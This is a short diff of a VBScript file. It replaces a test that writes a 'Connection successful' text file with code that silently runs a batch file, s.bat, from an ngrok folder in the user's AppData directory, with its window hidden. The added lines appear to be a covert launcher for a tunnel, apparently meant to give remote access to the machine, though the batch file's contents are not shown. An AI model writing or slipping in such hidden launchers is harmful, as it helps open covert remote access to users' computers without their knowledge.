@@ -1,4 +1,4 @@
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set file = fso.CreateTextFile("C:\Users\" & CreateObject("WScript.Network").UserName & "\Downloads\text3.txt", True)
-file.WriteLine("Connection successful")
-file.Close
+Set WshShell = CreateObject("WScript.Shell")
+path = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\AppData\Local\ngrok\")
+WshShell.Run """" & path & "s.bat""", 0, False
+
